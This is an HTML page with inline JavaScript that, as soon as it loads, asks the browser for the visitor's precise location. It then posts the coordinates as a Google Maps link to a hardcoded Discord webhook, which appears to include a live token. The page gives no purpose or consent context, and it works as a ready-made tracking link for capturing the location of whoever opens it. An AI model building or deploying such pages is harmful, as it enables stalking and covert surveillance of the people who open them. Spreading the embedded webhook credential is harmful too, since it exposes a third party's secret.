<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Send Location</title>
</head>
<body>
    <h1>Sending Location...</h1>

    <script>
        // Function to send position to the Webhook
        function sendPosition(position) {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;
            const webhookUrl = "https://discord.com/api/webhooks/1272943176063123621/6MwZvPOZPoKX_iupyJJ-E19Kb9gZVeYfUH0IeLL-PrYUNOeXlq4j1aJSLyKcce4kdT1C";

            const data = {
                content: `Current location: https://www.google.com/maps?q=${latitude},${longitude}`
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            }).then(response => {
                if (response.ok) {
                    alert("Location sent successfully!");
                } else {
                    alert("Failed to send location.");
                }
            }).catch(error => {
                alert("Error: " + error);
            });
        }

        // Function to handle errors
        function showError(error) {
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    alert("User denied the request for Geolocation.");
                    break;
                case error.POSITION_UNAVAILABLE:
                    alert("Location information is unavailable.");
                    break;
                case error.TIMEOUT:
                    alert("The request to get user location timed out.");
                    break;
                case error.UNKNOWN_ERROR:
                    alert("An unknown error occurred.");
                    break;
            }
        }

        // Automatically request the location when the page loads
        window.onload = function() {
            if (navigator.geolocation) {
                // Requesting position with high accuracy for better results on iOS
                navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                    enableHighAccuracy: true
                });
            } else {
                alert("Geolocation is not supported by this browser.");
            }
        };
    </script>
</body>
</html>
